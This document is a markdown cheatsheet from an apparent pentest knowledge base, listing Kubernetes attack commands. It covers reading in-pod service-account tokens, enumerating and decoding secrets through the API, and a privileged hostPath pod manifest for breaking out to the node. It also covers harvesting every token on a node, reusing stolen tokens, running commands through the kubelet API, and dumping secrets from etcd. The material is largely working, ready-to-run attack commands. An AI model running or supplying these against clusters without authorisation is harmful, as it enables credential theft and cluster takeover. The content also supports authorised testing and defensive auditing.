---
title: "Kubernetes Cheatsheet - kubectl Enumeration, In-Pod Recon and RBAC"
category: cloud
subcategory: kubernetes
type: cheatsheet
tags: [cloud, kubernetes, k8s, kubectl, rbac, can-i, service-account, token, in-pod, recon, secrets, namespace, apiserver, kubelet, curl, jq, privileged-pod]
summary: "kubectl enumeration and exploitation commands, in-pod recon one-liners, the service-account token paths, and a privileged-pod manifest."
tools: [kubectl, curl, jq, kubeletctl]
related: [kubernetes-attacks, container-escape, container-escape-cheatsheet, cloud-enum-script]
---

## In-pod recon (no kubectl needed)

```bash
# am I in kubernetes?
env | grep -i kubernetes
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# the service-account bundle
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
NAMESPACE=$(cat $SA/namespace)
CACERT=$SA/ca.crt
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# decode the token to learn my identity (JWT middle segment)
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .

# what does the environment reveal? (service discovery env vars)
env | grep -iE 'SERVICE_HOST|SERVICE_PORT|_TCP_'

# cluster DNS / reachable services
cat /etc/resolv.conf
nslookup kubernetes.default.svc.cluster.local 2>/dev/null
```

## Raw API access with curl (when kubectl is absent)

```bash
CURL="curl -sk -H \"Authorization: Bearer $TOKEN\""

# version
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/version"
# what am I allowed to do? (SelfSubjectRulesReview)
curl -sk -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'"$NAMESPACE"'"}}' | jq .
# can I do one specific thing? (SelfSubjectAccessReview)
curl -sk -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'"$NAMESPACE"'","verb":"get","resource":"secrets"}}}' | jq .status
# list resources
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" | jq '.items[].metadata.name'
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" | jq '.items[].metadata.name'
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" | jq '.items[].metadata.name'
# read a specific secret (values are base64)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/NAME" | jq '.data | map_values(@base64d)'
```

## kubectl: identity and permissions

```bash
# who am I (client cert / token subject)
kubectl auth whoami
# every permission I hold, as a matrix
kubectl auth can-i --list
kubectl auth can-i --list -n kube-system
# specific checks
kubectl auth can-i get secrets
kubectl auth can-i create pods
kubectl auth can-i create pods/exec
kubectl auth can-i '*' '*'                    # am I admin?
kubectl auth can-i get secrets --all-namespaces
# check as another identity (needs impersonate)
kubectl auth can-i get secrets --as system:serviceaccount:kube-system:default
```

## kubectl: enumeration

```bash
kubectl config current-context
kubectl config get-contexts
kubectl get namespaces
kubectl get pods -A -o wide
kubectl get pods -n NS -o yaml
kubectl get secrets -A
kubectl get secret NAME -n NS -o jsonpath='{.data}' | jq 'map_values(@base64d)'
kubectl get configmaps -A
kubectl get serviceaccounts -A
kubectl get roles,rolebindings -A
kubectl get clusterroles,clusterrolebindings
kubectl get nodes -o wide
kubectl get svc,ingress -A
kubectl get events -A --sort-by=.lastTimestamp
# describe reveals mounts, env, service account, security context
kubectl describe pod POD -n NS
# every pod's service account and security context in one query
kubectl get pods -A -o custom-columns=NS:.metadata.namespace,POD:.metadata.name,SA:.spec.serviceAccountName,PRIV:.spec.containers[*].securityContext.privileged
```

## kubectl: RBAC deep-dive

```bash
# who can do X? (needs the rbac plugins or manual parsing)
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'
# what does a role grant?
kubectl get clusterrole cluster-admin -o yaml
kubectl describe clusterrole edit
# bindings for a subject
kubectl get rolebindings,clusterrolebindings -A -o json | \
  jq -r '.items[] | select(.subjects[]?.name=="default") | .metadata.name'
# plugins that render this nicely
rakkess --as system:serviceaccount:NS:SA
rbac-lookup default
```

## kubectl: exec / logs / port-forward / cp

```bash
kubectl exec -it POD -n NS -- /bin/sh
kubectl exec POD -n NS -- id
kubectl logs POD -n NS
kubectl logs POD -n NS -c CONTAINER --previous
kubectl port-forward svc/internal 8080:80 -n NS
kubectl cp NS/POD:/etc/passwd ./passwd
kubectl debug node/NODE -it --image=busybox    # node shell (needs permission)
```

## Privileged / host-mounting pod manifest

```yaml
# priv-pod.yaml -- a pod that mounts the node root filesystem read-write.
# Only usable if you can `create pods` and the cluster's PodSecurity admission allows it.
apiVersion: v1
kind: Pod
metadata:
  name: recon
  namespace: default
spec:
  # schedule onto a specific node if you have a target
  # nodeName: node-1
  hostPID: true
  hostNetwork: true
  containers:
    - name: recon
      image: busybox
      command: ["/bin/sh", "-c", "sleep 1d"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host
          mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /
        type: Directory
```

```bash
kubectl apply -f priv-pod.yaml
kubectl exec -it recon -- chroot /host /bin/sh    # node filesystem
# read every kubelet-held service-account token on the node
kubectl exec recon -- find /host/var/lib/kubelet/pods -name token 2>/dev/null
# clean up
kubectl delete pod recon
```

## Service-account token abuse

```bash
# use a token you found as a different identity
kubectl --token="$OTHER_TOKEN" --server="$APISERVER" --insecure-skip-tls-verify get secrets -A
# build a kubeconfig from an in-pod token
kubectl config set-cluster c --server="$APISERVER" --insecure-skip-tls-verify=true
kubectl config set-credentials u --token="$TOKEN"
kubectl config set-context ctx --cluster=c --user=u --namespace="$NAMESPACE"
kubectl config use-context ctx
# mint a token for a service account (needs create serviceaccounts/token)
kubectl create token SA -n NS --duration=1h
```

## Kubelet (node-level, port 10250)

```bash
# list pods a kubelet knows about (if anonymous or your token is accepted)
curl -sk https://NODE:10250/pods | jq '.items[].metadata.name'
# run a command in a pod via the kubelet (older /run API)
curl -sk -X POST "https://NODE:10250/run/NS/POD/CONTAINER" -d "cmd=id"
# kubeletctl automates this
kubeletctl -s NODE pods
kubeletctl -s NODE exec "id" -p POD -c CONTAINER
kubeletctl -s NODE scan token          # harvest tokens from all pods on the node
```

## etcd (control-plane, port 2379)

```bash
# only with client certs (often /etc/kubernetes/pki/etcd/*)
export ETCDCTL_API=3
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=ca.crt --cert=client.crt --key=client.key \
  get / --prefix --keys-only | head
# secrets are stored under /registry/secrets/
etcdctl --endpoints=... get /registry/secrets/NS/NAME
```

## Tools

```bash
kube-hunter --pod                 # in-pod misconfiguration scan
kube-hunter --remote NODE         # external
kube-bench                        # CIS benchmark on a node
peirates                          # interactive k8s pentest tool
kubeletctl                        # kubelet API client
rakkess / rbac-lookup             # RBAC matrices
```
